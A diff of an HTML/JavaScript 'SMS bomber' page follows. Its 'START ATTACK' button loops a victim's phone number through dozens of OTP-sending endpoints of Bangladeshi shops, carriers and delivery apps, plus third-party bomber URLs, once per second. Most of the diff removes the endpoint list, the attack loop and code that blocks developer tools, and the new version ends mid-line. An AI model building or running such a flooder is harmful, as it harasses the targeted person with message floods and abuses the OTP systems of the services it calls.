@@ -113,7 +113,6 @@
     <input type="number" id="amount" placeholder="Request Amount">
     <button onclick="sendOTP()">START ATTACK</button>
     
-    <div id="loadingSpinner"></div>
     <div id="countdownTimer"></div>
     <div id="progressContainer">
       <div id="progressBar"></div>
@@ -173,110 +172,4 @@
         { url: `https://fundesh.com.bd/api/auth/generateOTP?service_key=`, method: 'POST', data: { msisdn: phone } },
         { url: `https://api.swap.com.bd/api/v1/send-otp`, method: 'POST', data: { phone: phone } },
         { url: `https://api.bd.airtel.com/v1/account/login/otp`, method: 'POST', data: { phone_number: phone } },
-        { url: `https://eshop-api.banglalink.net/api/v1/customer/send-otp`, method: 'POST', data: { type: 'phone', phone: phone } },
-        { url: `https://cherykuwait.com/topbomb.php?phone=${phone}&amount=${amount}`, method: 'GET' },
-        { url: `https://tcsbomberai.vercel.app/api/smsbomber?phone=${phone}`, method: 'GET' },
-        { url: `https://ck638.ct.ws/?number=${phone}`, method: 'GET' },
-        { url: `https://backoffice.ecourier.com.bd/api/web/individual-send-otp?mobile=${phone}`, method: 'GET' },
-        { url: `https://bj-x-coder.top/bo_m_ber.php?phone=${phone}&amount=${amount}`, method: 'GET' },
-        { url: `https://zeron-num-info2o.vercel.app/api/search?num=${phone}`, method: 'GET' },
-        { url: `https://lmnx9.appletolha.com/boom/free.php?number=${phone}&amount=${amount}`, method: 'GET' },
-        { url: `https://lmnx9.appletolha.com/call-boomber/trial.php?number=${phone}`, method: 'GET' },
-        { url: `https://member.daraz.com.bd/user/api/send_otp`, method: 'POST', data: { phone: phone, type: 'login' } },
-        { url: `https://api.pathao.com/v1/user/otp`, method: 'POST', data: { phone: phone } },
-        { url: `https://www.chaldal.com/api/v1/user/otp`, method: 'POST', data: { phone: phone } },
-        { url: `https://api.hungrynaki.com/v1/user/otp`, method: 'POST', data: { phone: phone } },
-        { url: `https://api.bdtickets.com/v1/user/otp`, method: 'POST', data: { phone: phone } },
-        { url: `https://api.shohoz.com/v1/user/otp`, method: 'POST', data: { phone: phone } },
-        { url: `https://api.foodpanda.com.bd/api/v2/otp`, method: 'POST', data: { phone: phone } },
-        { url: `https://api.sheba.xyz/v1/user/otp`, method: 'POST', data: { phone: phone } },
-        { url: `https://api.ajkerdeal.com/v1/user/otp`, method: 'POST', data: { phone: phone } },
-        { url: `https://api.shwapno.com/v1/user/otp`, method: 'POST', data: { phone: phone } },
-        { url: `https://api.evaly.com.bd/v1/user/otp`, method: 'POST', data: { phone: phone } },
-        { url: `https://api.clicknshop.com.bd/v1/user/otp`, method: 'POST', data: { phone: phone } },
-        { url: `https://api.pickaboo.com/v1/user/otp`, method: 'POST', data: { phone: phone } },
-        { url: `https://api.priyoshop.com/v1/user/otp`, method: 'POST', data: { phone: phone } },
-        { url: `https://api.startech.com.bd/v1/user/otp`, method: 'POST', data: { phone: phone } },
-        { url: `https://api.ryanscomputers.com/v1/user/otp`, method: 'POST', data: { phone: phone } },
-        { url: `https://api.techlandbd.com/v1/user/otp`, method: 'POST', data: { phone: phone } },
-        { url: `https://api.skder.com/v1/user/otp`, method: 'POST', data: { phone: phone } },
-        { url: `https://api.deligram.com/v1/user/otp`, method: 'POST', data: { phone: phone } },
-        { url: `https://api.oasbd.com/v1/user/otp`, method: 'POST', data: { phone: phone } },
-        { url: `https://api.bagdoom.com/v1/user/otp`, method: 'POST', data: { phone: phone } },
-        { url: `https://api.rokomari.com/v1/user/otp`, method: 'POST', data: { phone: phone } },
-        { url: `https://api.boibazar.com/v1/user/otp`, method: 'POST', data: { phone: phone } },
-        { url: `https://api.eorange.shop/v1/user/otp`, method: 'POST', data: { phone: phone } },
-        { url: `https://api.dhamakashopping.com/v1/user/otp`, method: 'POST', data: { phone: phone } },
-        { url: `https://api.aleshamart.com/v1/user/otp`, method: 'POST', data: { phone: phone } },
-        { url: `https://api.qcoom.com/v1/user/otp`, method: 'POST', data: { phone: phone } },
-        { url: `https://api.boishakhi.com/v1/user/otp`, method: 'POST', data: { phone: phone } },
-        { url: `https://api.need.com.bd/v1/user/otp`, method: 'POST', data: { phone: phone } }
-      ];
-
-      let successCount = 0;
-      for (let i = 0; i < amount; i++) {
-        timerDisplay.innerText = `Time Left: ${amount - i}s`;
-        
-        for (let api of apis) {
-          let result = await sendRequest(api.url, api.method, api.data);
-          if (result) successCount++;
-        }
-
-        let progress = ((i + 1) / amount) * 100;
-        progressBar.style.width = progress + '%';
-        await delay(1000); 
-      }
-
-      // ১ নম্বর জায়গা ক্লিয়ার এবং সাকসেস মেসেজ (৩ নম্বর)
-      timerDisplay.innerText = ""; 
-
-      if (successCount > 0) {
-        responseMessage.innerHTML = `<span class="alert success">Attack Complete! (${successCount} Hits)</span>`;
-        if (typeof sound !== 'undefined') sound.play();
-      } else {
-        responseMessage.innerHTML = `<span class="alert failure">Attack Failed!</span>`;
-      }
-    }
-
-    // Matrix Rain Animation
-    const canvas = document.getElementById('matrixCanvas');
-    const ctx = canvas.getContext('2d');
-    canvas.width = window.innerWidth;
-    canvas.height = window.innerHeight;
-
-    const letters = "01010101PHANTOMVOID";
-    const fontSize = 16;
-    const columns = canvas.width / fontSize;
-    const drops = Array.from({ length: columns }).fill(1);
-
-    function draw() {
-      ctx.fillStyle = "rgba(0, 0, 0, 0.05)";
-      ctx.fillRect(0, 0, canvas.width, canvas.height);
-      ctx.fillStyle = "#0F0";
-      ctx.font = fontSize + "px monospace";
-      for (let i = 0; i < drops.length; i++) {
-        const text = letters[Math.floor(Math.random() * letters.length)];
-        ctx.fillText(text, i * fontSize, drops[i] * fontSize);
-        if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) drops[i] = 0;
-        drops[i]++;
-      }
-    }
-    setInterval(draw, 35);
-
-    window.addEventListener('resize', () => {
-      canvas.width = window.innerWidth;
-      canvas.height = window.innerHeight;
-    });
-
-    // Security Features
-    (function () {
-      document.addEventListener("contextmenu", e => e.preventDefault());
-      document.addEventListener("keydown", e => {
-        if (e.key === "F12" || (e.ctrlKey && e.shiftKey && ["I", "C", "J"].includes(e.key)) || (e.ctrlKey && e.key === "U")) {
-          e.preventDefault();
-        }
-      });
-    })();
-  </script>
-</body>
-</html>
+        { url: `https://eshop-api.banglalink.net/api/v1/customer/send-otp`, method: 'POST', data: { type: 'phone',
